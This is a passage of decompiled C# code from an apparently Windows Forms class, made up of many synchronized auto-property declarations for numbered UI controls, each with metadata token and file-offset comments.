		// Token: 0x170003B4 RID: 948
		// (get) Token: 0x06000783 RID: 1923 RVA: 0x0002834F File Offset: 0x0002654F
		// (set) Token: 0x06000784 RID: 1924 RVA: 0x00028357 File Offset: 0x00026557
		internal virtual ComboBox ComboBox25 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170003B5 RID: 949
		// (get) Token: 0x06000785 RID: 1925 RVA: 0x00028360 File Offset: 0x00026560
		// (set) Token: 0x06000786 RID: 1926 RVA: 0x00028368 File Offset: 0x00026568
		internal virtual Button Button25 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170003B6 RID: 950
		// (get) Token: 0x06000787 RID: 1927 RVA: 0x00028371 File Offset: 0x00026571
		// (set) Token: 0x06000788 RID: 1928 RVA: 0x00028379 File Offset: 0x00026579
		internal virtual CheckedListBox CheckedListBox38 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170003B7 RID: 951
		// (get) Token: 0x06000789 RID: 1929 RVA: 0x00028382 File Offset: 0x00026582
		// (set) Token: 0x0600078A RID: 1930 RVA: 0x0002838A File Offset: 0x0002658A
		internal virtual ComboBox ComboBox26 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170003B8 RID: 952
		// (get) Token: 0x0600078B RID: 1931 RVA: 0x00028393 File Offset: 0x00026593
		// (set) Token: 0x0600078C RID: 1932 RVA: 0x0002839B File Offset: 0x0002659B
		internal virtual MonthCalendar MonthCalendar27 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170003B9 RID: 953
		// (get) Token: 0x0600078D RID: 1933 RVA: 0x000283A4 File Offset: 0x000265A4
		// (set) Token: 0x0600078E RID: 1934 RVA: 0x000283AC File Offset: 0x000265AC
		internal virtual MonthCalendar MonthCalendar28 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170003BA RID: 954
		// (get) Token: 0x0600078F RID: 1935 RVA: 0x000283B5 File Offset: 0x000265B5
		// (set) Token: 0x06000790 RID: 1936 RVA: 0x000283BD File Offset: 0x000265BD
		internal virtual LinkLabel LinkLabel38 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170003BB RID: 955
		// (get) Token: 0x06000791 RID: 1937 RVA: 0x000283C6 File Offset: 0x000265C6
		// (set) Token: 0x06000792 RID: 1938 RVA: 0x000283CE File Offset: 0x000265CE
		internal virtual ProgressBar ProgressBar52 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170003BC RID: 956
		// (get) Token: 0x06000793 RID: 1939 RVA: 0x000283D7 File Offset: 0x000265D7
		// (set) Token: 0x06000794 RID: 1940 RVA: 0x000283DF File Offset: 0x000265DF
		internal virtual LinkLabel LinkLabel39 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170003BD RID: 957
		// (get) Token: 0x06000795 RID: 1941 RVA: 0x000283E8 File Offset: 0x000265E8
		// (set) Token: 0x06000796 RID: 1942 RVA: 0x000283F0 File Offset: 0x000265F0
		internal virtual ListBox ListBox39 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170003BE RID: 958
		// (get) Token: 0x06000797 RID: 1943 RVA: 0x000283F9 File Offset: 0x000265F9
		// (set) Token: 0x06000798 RID: 1944 RVA: 0x00028401 File Offset: 0x00026601
		internal virtual CheckBox CheckBox26 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170003BF RID: 959
		// (get) Token: 0x06000799 RID: 1945 RVA: 0x0002840A File Offset: 0x0002660A
		// (set) Token: 0x0600079A RID: 1946 RVA: 0x00028412 File Offset: 0x00026612
		internal virtual CheckedListBox CheckedListBox39 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170003C0 RID: 960
		// (get) Token: 0x0600079B RID: 1947 RVA: 0x0002841B File Offset: 0x0002661B
		// (set) Token: 0x0600079C RID: 1948 RVA: 0x00028423 File Offset: 0x00026623
		internal virtual Button Button26 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170003C1 RID: 961
		// (get) Token: 0x0600079D RID: 1949 RVA: 0x0002842C File Offset: 0x0002662C
		// (set) Token: 0x0600079E RID: 1950 RVA: 0x00028434 File Offset: 0x00026634
		internal virtual ProgressBar ProgressBar53 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170003C2 RID: 962
		// (get) Token: 0x0600079F RID: 1951 RVA: 0x0002843D File Offset: 0x0002663D
		// (set) Token: 0x060007A0 RID: 1952 RVA: 0x00028445 File Offset: 0x00026645
		internal virtual ProgressBar ProgressBar54 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170003C3 RID: 963
		// (get) Token: 0x060007A1 RID: 1953 RVA: 0x0002844E File Offset: 0x0002664E
		// (set) Token: 0x060007A2 RID: 1954 RVA: 0x00028456 File Offset: 0x00026656
		internal virtual DateTimePicker DateTimePicker27 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170003C4 RID: 964
		// (get) Token: 0x060007A3 RID: 1955 RVA: 0x0002845F File Offset: 0x0002665F
		// (set) Token: 0x060007A4 RID: 1956 RVA: 0x00028467 File Offset: 0x00026667
		internal virtual CheckedListBox CheckedListBox40 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170003C5 RID: 965
		// (get) Token: 0x060007A5 RID: 1957 RVA: 0x00028470 File Offset: 0x00026670
		// (set) Token: 0x060007A6 RID: 1958 RVA: 0x00028478 File Offset: 0x00026678
		internal virtual ListBox ListBox40 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170003C6 RID: 966
		// (get) Token: 0x060007A7 RID: 1959 RVA: 0x00028481 File Offset: 0x00026681
		// (set) Token: 0x060007A8 RID: 1960 RVA: 0x00028489 File Offset: 0x00026689
		internal virtual DateTimePicker DateTimePicker28 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170003C7 RID: 967
		// (get) Token: 0x060007A9 RID: 1961 RVA: 0x00028492 File Offset: 0x00026692
		// (set) Token: 0x060007AA RID: 1962 RVA: 0x0002849A File Offset: 0x0002669A
		internal virtual ListBox ListBox41 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170003C8 RID: 968
		// (get) Token: 0x060007AB RID: 1963 RVA: 0x000284A3 File Offset: 0x000266A3
		// (set) Token: 0x060007AC RID: 1964 RVA: 0x000284AB File Offset: 0x000266AB
		internal virtual Label Label14 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170003C9 RID: 969
		// (get) Token: 0x060007AD RID: 1965 RVA: 0x000284B4 File Offset: 0x000266B4
		// (set) Token: 0x060007AE RID: 1966 RVA: 0x000284BC File Offset: 0x000266BC
		internal virtual MaskedTextBox MaskedTextBox27 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170003CA RID: 970
		// (get) Token: 0x060007AF RID: 1967 RVA: 0x000284C5 File Offset: 0x000266C5
		// (set) Token: 0x060007B0 RID: 1968 RVA: 0x000284CD File Offset: 0x000266CD
		internal virtual RadioButton RadioButton27 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170003CB RID: 971
		// (get) Token: 0x060007B1 RID: 1969 RVA: 0x000284D6 File Offset: 0x000266D6
		// (set) Token: 0x060007B2 RID: 1970 RVA: 0x000284DE File Offset: 0x000266DE
		internal virtual PictureBox PictureBox27 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170003CC RID: 972
		// (get) Token: 0x060007B3 RID: 1971 RVA: 0x000284E7 File Offset: 0x000266E7
		// (set) Token: 0x060007B4 RID: 1972 RVA: 0x000284EF File Offset: 0x000266EF
		internal virtual MaskedTextBox MaskedTextBox28 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170003CD RID: 973
		// (get) Token: 0x060007B5 RID: 1973 RVA: 0x000284F8 File Offset: 0x000266F8
		// (set) Token: 0x060007B6 RID: 1974 RVA: 0x00028500 File Offset: 0x00026700
		internal virtual WebBrowser WebBrowser14 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170003CE RID: 974
		// (get) Token: 0x060007B7 RID: 1975 RVA: 0x00028509 File Offset: 0x00026709
		// (set) Token: 0x060007B8 RID: 1976 RVA: 0x00028511 File Offset: 0x00026711
		internal virtual TreeView TreeView14 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170003CF RID: 975
		// (get) Token: 0x060007B9 RID: 1977 RVA: 0x0002851A File Offset: 0x0002671A
		// (set) Token: 0x060007BA RID: 1978 RVA: 0x00028522 File Offset: 0x00026722
		internal virtual PictureBox PictureBox28 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170003D0 RID: 976
		// (get) Token: 0x060007BB RID: 1979 RVA: 0x0002852B File Offset: 0x0002672B
		// (set) Token: 0x060007BC RID: 1980 RVA: 0x00028533 File Offset: 0x00026733
		internal virtual NumericUpDown NumericUpDown14 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170003D1 RID: 977
		// (get) Token: 0x060007BD RID: 1981 RVA: 0x0002853C File Offset: 0x0002673C
		// (set) Token: 0x060007BE RID: 1982 RVA: 0x00028544 File Offset: 0x00026744
		internal virtual ProgressBar ProgressBar55 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170003D2 RID: 978
		// (get) Token: 0x060007BF RID: 1983 RVA: 0x0002854D File Offset: 0x0002674D
		// (set) Token: 0x060007C0 RID: 1984 RVA: 0x00028555 File Offset: 0x00026755
		internal virtual RadioButton RadioButton28 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170003D3 RID: 979
		// (get) Token: 0x060007C1 RID: 1985 RVA: 0x0002855E File Offset: 0x0002675E
		// (set) Token: 0x060007C2 RID: 1986 RVA: 0x00028566 File Offset: 0x00026766
		internal virtual LinkLabel LinkLabel40 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170003D4 RID: 980
		// (get) Token: 0x060007C3 RID: 1987 RVA: 0x0002856F File Offset: 0x0002676F
		// (set) Token: 0x060007C4 RID: 1988 RVA: 0x00028577 File Offset: 0x00026777
		internal virtual CheckBox CheckBox27 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170003D5 RID: 981
		// (get) Token: 0x060007C5 RID: 1989 RVA: 0x00028580 File Offset: 0x00026780
		// (set) Token: 0x060007C6 RID: 1990 RVA: 0x00028588 File Offset: 0x00026788
		internal virtual ComboBox ComboBox27 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170003D6 RID: 982
		// (get) Token: 0x060007C7 RID: 1991 RVA: 0x00028591 File Offset: 0x00026791
		// (set) Token: 0x060007C8 RID: 1992 RVA: 0x00028599 File Offset: 0x00026799
		internal virtual Button Button27 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170003D7 RID: 983
		// (get) Token: 0x060007C9 RID: 1993 RVA: 0x000285A2 File Offset: 0x000267A2
		// (set) Token: 0x060007CA RID: 1994 RVA: 0x000285AA File Offset: 0x000267AA
		internal virtual CheckedListBox CheckedListBox41 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170003D8 RID: 984
		// (get) Token: 0x060007CB RID: 1995 RVA: 0x000285B3 File Offset: 0x000267B3
		// (set) Token: 0x060007CC RID: 1996 RVA: 0x000285BB File Offset: 0x000267BB
		internal virtual ComboBox ComboBox28 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170003D9 RID: 985
		// (get) Token: 0x060007CD RID: 1997 RVA: 0x000285C4 File Offset: 0x000267C4
		// (set) Token: 0x060007CE RID: 1998 RVA: 0x000285CC File Offset: 0x000267CC
		internal virtual MonthCalendar MonthCalendar29 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170003DA RID: 986
		// (get) Token: 0x060007CF RID: 1999 RVA: 0x000285D5 File Offset: 0x000267D5
		// (set) Token: 0x060007D0 RID: 2000 RVA: 0x000285DD File Offset: 0x000267DD
		internal virtual MonthCalendar MonthCalendar30 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170003DB RID: 987
		// (get) Token: 0x060007D1 RID: 2001 RVA: 0x000285E6 File Offset: 0x000267E6
		// (set) Token: 0x060007D2 RID: 2002 RVA: 0x000285EE File Offset: 0x000267EE
		internal virtual LinkLabel LinkLabel41 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170003DC RID: 988
		// (get) Token: 0x060007D3 RID: 2003 RVA: 0x000285F7 File Offset: 0x000267F7
		// (set) Token: 0x060007D4 RID: 2004 RVA: 0x000285FF File Offset: 0x000267FF
		internal virtual ProgressBar ProgressBar56 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170003DD RID: 989
		// (get) Token: 0x060007D5 RID: 2005 RVA: 0x00028608 File Offset: 0x00026808
		// (set) Token: 0x060007D6 RID: 2006 RVA: 0x00028610 File Offset: 0x00026810
		internal virtual LinkLabel LinkLabel42 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170003DE RID: 990
		// (get) Token: 0x060007D7 RID: 2007 RVA: 0x00028619 File Offset: 0x00026819
		// (set) Token: 0x060007D8 RID: 2008 RVA: 0x00028621 File Offset: 0x00026821
		internal virtual ListBox ListBox42 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170003DF RID: 991
		// (get) Token: 0x060007D9 RID: 2009 RVA: 0x0002862A File Offset: 0x0002682A
		// (set) Token: 0x060007DA RID: 2010 RVA: 0x00028632 File Offset: 0x00026832
		internal virtual CheckBox CheckBox28 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170003E0 RID: 992
		// (get) Token: 0x060007DB RID: 2011 RVA: 0x0002863B File Offset: 0x0002683B
		// (set) Token: 0x060007DC RID: 2012 RVA: 0x00028643 File Offset: 0x00026843
		internal virtual CheckedListBox CheckedListBox42 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170003E1 RID: 993
		// (get) Token: 0x060007DD RID: 2013 RVA: 0x0002864C File Offset: 0x0002684C
		// (set) Token: 0x060007DE RID: 2014 RVA: 0x00028654 File Offset: 0x00026854
		internal virtual Button Button28 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170003E2 RID: 994
		// (get) Token: 0x060007DF RID: 2015 RVA: 0x0002865D File Offset: 0x0002685D
		// (set) Token: 0x060007E0 RID: 2016 RVA: 0x00028665 File Offset: 0x00026865
		internal virtual ProgressBar ProgressBar57 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170003E3 RID: 995
		// (get) Token: 0x060007E1 RID: 2017 RVA: 0x0002866E File Offset: 0x0002686E
		// (set) Token: 0x060007E2 RID: 2018 RVA: 0x00028676 File Offset: 0x00026876
		internal virtual ProgressBar ProgressBar58 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170003E4 RID: 996
		// (get) Token: 0x060007E3 RID: 2019 RVA: 0x0002867F File Offset: 0x0002687F
		// (set) Token: 0x060007E4 RID: 2020 RVA: 0x00028687 File Offset: 0x00026887
		internal virtual DateTimePicker DateTimePicker29 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170003E5 RID: 997
		// (get) Token: 0x060007E5 RID: 2021 RVA: 0x00028690 File Offset: 0x00026890
		// (set) Token: 0x060007E6 RID: 2022 RVA: 0x00028698 File Offset: 0x00026898
		internal virtual CheckedListBox CheckedListBox43 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170003E6 RID: 998
		// (get) Token: 0x060007E7 RID: 2023 RVA: 0x000286A1 File Offset: 0x000268A1
		// (set) Token: 0x060007E8 RID: 2024 RVA: 0x000286A9 File Offset: 0x000268A9
		internal virtual ListBox ListBox43 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170003E7 RID: 999
		// (get) Token: 0x060007E9 RID: 2025 RVA: 0x000286B2 File Offset: 0x000268B2
		// (set) Token: 0x060007EA RID: 2026 RVA: 0x000286BA File Offset: 0x000268BA
		internal virtual DateTimePicker DateTimePicker30 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170003E8 RID: 1000
		// (get) Token: 0x060007EB RID: 2027 RVA: 0x000286C3 File Offset: 0x000268C3
		// (set) Token: 0x060007EC RID: 2028 RVA: 0x000286CB File Offset: 0x000268CB
		internal virtual ListBox ListBox44 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170003E9 RID: 1001
		// (get) Token: 0x060007ED RID: 2029 RVA: 0x000286D4 File Offset: 0x000268D4
		// (set) Token: 0x060007EE RID: 2030 RVA: 0x000286DC File Offset: 0x000268DC
		internal virtual Label Label15 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170003EA RID: 1002
		// (get) Token: 0x060007EF RID: 2031 RVA: 0x000286E5 File Offset: 0x000268E5
		// (set) Token: 0x060007F0 RID: 2032 RVA: 0x000286ED File Offset: 0x000268ED
		internal virtual MaskedTextBox MaskedTextBox29 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170003EB RID: 1003
		// (get) Token: 0x060007F1 RID: 2033 RVA: 0x000286F6 File Offset: 0x000268F6
		// (set) Token: 0x060007F2 RID: 2034 RVA: 0x000286FE File Offset: 0x000268FE
		internal virtual RadioButton RadioButton29 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170003EC RID: 1004
		// (get) Token: 0x060007F3 RID: 2035 RVA: 0x00028707 File Offset: 0x00026907
		// (set) Token: 0x060007F4 RID: 2036 RVA: 0x0002870F File Offset: 0x0002690F
		internal virtual PictureBox PictureBox29 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170003ED RID: 1005
		// (get) Token: 0x060007F5 RID: 2037 RVA: 0x00028718 File Offset: 0x00026918
		// (set) Token: 0x060007F6 RID: 2038 RVA: 0x00028720 File Offset: 0x00026920
		internal virtual MaskedTextBox MaskedTextBox30 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170003EE RID: 1006
		// (get) Token: 0x060007F7 RID: 2039 RVA: 0x00028729 File Offset: 0x00026929
		// (set) Token: 0x060007F8 RID: 2040 RVA: 0x00028731 File Offset: 0x00026931
		internal virtual WebBrowser WebBrowser15 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170003EF RID: 1007
		// (get) Token: 0x060007F9 RID: 2041 RVA: 0x0002873A File Offset: 0x0002693A
		// (set) Token: 0x060007FA RID: 2042 RVA: 0x00028742 File Offset: 0x00026942
		internal virtual TreeView TreeView15 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170003F0 RID: 1008
		// (get) Token: 0x060007FB RID: 2043 RVA: 0x0002874B File Offset: 0x0002694B
		// (set) Token: 0x060007FC RID: 2044 RVA: 0x00028753 File Offset: 0x00026953
		internal virtual PictureBox PictureBox30 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170003F1 RID: 1009
		// (get) Token: 0x060007FD RID: 2045 RVA: 0x0002875C File Offset: 0x0002695C
		// (set) Token: 0x060007FE RID: 2046 RVA: 0x00028764 File Offset: 0x00026964
		internal virtual NumericUpDown NumericUpDown15 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170003F2 RID: 1010
		// (get) Token: 0x060007FF RID: 2047 RVA: 0x0002876D File Offset: 0x0002696D
		// (set) Token: 0x06000800 RID: 2048 RVA: 0x00028775 File Offset: 0x00026975
		internal virtual ProgressBar ProgressBar59 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170003F3 RID: 1011
		// (get) Token: 0x06000801 RID: 2049 RVA: 0x0002877E File Offset: 0x0002697E
		// (set) Token: 0x06000802 RID: 2050 RVA: 0x00028786 File Offset: 0x00026986
		internal virtual RadioButton RadioButton30 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170003F4 RID: 1012
		// (get) Token: 0x06000803 RID: 2051 RVA: 0x0002878F File Offset: 0x0002698F
		// (set) Token: 0x06000804 RID: 2052 RVA: 0x00028797 File Offset: 0x00026997
		internal virtual LinkLabel LinkLabel43 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170003F5 RID: 1013
		// (get) Token: 0x06000805 RID: 2053 RVA: 0x000287A0 File Offset: 0x000269A0
		// (set) Token: 0x06000806 RID: 2054 RVA: 0x000287A8 File Offset: 0x000269A8
		internal virtual CheckBox CheckBox29 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170003F6 RID: 1014
		// (get) Token: 0x06000807 RID: 2055 RVA: 0x000287B1 File Offset: 0x000269B1
		// (set) Token: 0x06000808 RID: 2056 RVA: 0x000287B9 File Offset: 0x000269B9
		internal virtual ComboBox ComboBox29 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170003F7 RID: 1015
		// (get) Token: 0x06000809 RID: 2057 RVA: 0x000287C2 File Offset: 0x000269C2
		// (set) Token: 0x0600080A RID: 2058 RVA: 0x000287CA File Offset: 0x000269CA
		internal virtual Button Button29 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170003F8 RID: 1016
		// (get) Token: 0x0600080B RID: 2059 RVA: 0x000287D3 File Offset: 0x000269D3
		// (set) Token: 0x0600080C RID: 2060 RVA: 0x000287DB File Offset: 0x000269DB
		internal virtual CheckedListBox CheckedListBox44 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170003F9 RID: 1017
		// (get) Token: 0x0600080D RID: 2061 RVA: 0x000287E4 File Offset: 0x000269E4
		// (set) Token: 0x0600080E RID: 2062 RVA: 0x000287EC File Offset: 0x000269EC
		internal virtual ComboBox ComboBox30 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170003FA RID: 1018
		// (get) Token: 0x0600080F RID: 2063 RVA: 0x000287F5 File Offset: 0x000269F5
		// (set) Token: 0x06000810 RID: 2064 RVA: 0x000287FD File Offset: 0x000269FD
		internal virtual MonthCalendar MonthCalendar31 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170003FB RID: 1019
		// (get) Token: 0x06000811 RID: 2065 RVA: 0x00028806 File Offset: 0x00026A06
		// (set) Token: 0x06000812 RID: 2066 RVA: 0x0002880E File Offset: 0x00026A0E
		internal virtual MonthCalendar MonthCalendar32 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170003FC RID: 1020
		// (get) Token: 0x06000813 RID: 2067 RVA: 0x00028817 File Offset: 0x00026A17
		// (set) Token: 0x06000814 RID: 2068 RVA: 0x0002881F File Offset: 0x00026A1F
		internal virtual LinkLabel LinkLabel44 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170003FD RID: 1021
		// (get) Token: 0x06000815 RID: 2069 RVA: 0x00028828 File Offset: 0x00026A28
		// (set) Token: 0x06000816 RID: 2070 RVA: 0x00028830 File Offset: 0x00026A30
		internal virtual ProgressBar ProgressBar60 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170003FE RID: 1022
		// (get) Token: 0x06000817 RID: 2071 RVA: 0x00028839 File Offset: 0x00026A39
		// (set) Token: 0x06000818 RID: 2072 RVA: 0x00028841 File Offset: 0x00026A41
		internal virtual LinkLabel LinkLabel45 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170003FF RID: 1023
		// (get) Token: 0x06000819 RID: 2073 RVA: 0x0002884A File Offset: 0x00026A4A
		// (set) Token: 0x0600081A RID: 2074 RVA: 0x00028852 File Offset: 0x00026A52
		internal virtual ListBox ListBox45 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000400 RID: 1024
		// (get) Token: 0x0600081B RID: 2075 RVA: 0x0002885B File Offset: 0x00026A5B
		// (set) Token: 0x0600081C RID: 2076 RVA: 0x00028863 File Offset: 0x00026A63
		internal virtual CheckBox CheckBox30 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000401 RID: 1025
		// (get) Token: 0x0600081D RID: 2077 RVA: 0x0002886C File Offset: 0x00026A6C
		// (set) Token: 0x0600081E RID: 2078 RVA: 0x00028874 File Offset: 0x00026A74
		internal virtual CheckedListBox CheckedListBox45 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000402 RID: 1026
		// (get) Token: 0x0600081F RID: 2079 RVA: 0x0002887D File Offset: 0x00026A7D
		// (set) Token: 0x06000820 RID: 2080 RVA: 0x00028885 File Offset: 0x00026A85
		internal virtual Button Button30 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000403 RID: 1027
		// (get) Token: 0x06000821 RID: 2081 RVA: 0x0002888E File Offset: 0x00026A8E
		// (set) Token: 0x06000822 RID: 2082 RVA: 0x00028896 File Offset: 0x00026A96
		internal virtual ProgressBar ProgressBar61 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000404 RID: 1028
		// (get) Token: 0x06000823 RID: 2083 RVA: 0x0002889F File Offset: 0x00026A9F
		// (set) Token: 0x06000824 RID: 2084 RVA: 0x000288A7 File Offset: 0x00026AA7
		internal virtual ProgressBar ProgressBar62 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000405 RID: 1029
		// (get) Token: 0x06000825 RID: 2085 RVA: 0x000288B0 File Offset: 0x00026AB0
		// (set) Token: 0x06000826 RID: 2086 RVA: 0x000288B8 File Offset: 0x00026AB8
		internal virtual DateTimePicker DateTimePicker31 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000406 RID: 1030
		// (get) Token: 0x06000827 RID: 2087 RVA: 0x000288C1 File Offset: 0x00026AC1
		// (set) Token: 0x06000828 RID: 2088 RVA: 0x000288C9 File Offset: 0x00026AC9
		internal virtual CheckedListBox CheckedListBox46 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000407 RID: 1031
		// (get) Token: 0x06000829 RID: 2089 RVA: 0x000288D2 File Offset: 0x00026AD2
		// (set) Token: 0x0600082A RID: 2090 RVA: 0x000288DA File Offset: 0x00026ADA
		internal virtual ListBox ListBox46 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000408 RID: 1032
		// (get) Token: 0x0600082B RID: 2091 RVA: 0x000288E3 File Offset: 0x00026AE3
		// (set) Token: 0x0600082C RID: 2092 RVA: 0x000288EB File Offset: 0x00026AEB
		internal virtual DateTimePicker DateTimePicker32 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000409 RID: 1033
		// (get) Token: 0x0600082D RID: 2093 RVA: 0x000288F4 File Offset: 0x00026AF4
		// (set) Token: 0x0600082E RID: 2094 RVA: 0x000288FC File Offset: 0x00026AFC
		internal virtual ListBox ListBox47 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700040A RID: 1034
		// (get) Token: 0x0600082F RID: 2095 RVA: 0x00028905 File Offset: 0x00026B05
		// (set) Token: 0x06000830 RID: 2096 RVA: 0x0002890D File Offset: 0x00026B0D
		internal virtual Label Label16 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700040B RID: 1035
		// (get) Token: 0x06000831 RID: 2097 RVA: 0x00028916 File Offset: 0x00026B16
		// (set) Token: 0x06000832 RID: 2098 RVA: 0x0002891E File Offset: 0x00026B1E
		internal virtual MaskedTextBox MaskedTextBox31 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700040C RID: 1036
		// (get) Token: 0x06000833 RID: 2099 RVA: 0x00028927 File Offset: 0x00026B27
		// (set) Token: 0x06000834 RID: 2100 RVA: 0x0002892F File Offset: 0x00026B2F
		internal virtual RadioButton RadioButton31 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700040D RID: 1037
		// (get) Token: 0x06000835 RID: 2101 RVA: 0x00028938 File Offset: 0x00026B38
		// (set) Token: 0x06000836 RID: 2102 RVA: 0x00028940 File Offset: 0x00026B40
		internal virtual PictureBox PictureBox31 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700040E RID: 1038
		// (get) Token: 0x06000837 RID: 2103 RVA: 0x00028949 File Offset: 0x00026B49
		// (set) Token: 0x06000838 RID: 2104 RVA: 0x00028951 File Offset: 0x00026B51
		internal virtual MaskedTextBox MaskedTextBox32 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700040F RID: 1039
		// (get) Token: 0x06000839 RID: 2105 RVA: 0x0002895A File Offset: 0x00026B5A
		// (set) Token: 0x0600083A RID: 2106 RVA: 0x00028962 File Offset: 0x00026B62
		internal virtual WebBrowser WebBrowser16 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000410 RID: 1040
		// (get) Token: 0x0600083B RID: 2107 RVA: 0x0002896B File Offset: 0x00026B6B
		// (set) Token: 0x0600083C RID: 2108 RVA: 0x00028973 File Offset: 0x00026B73
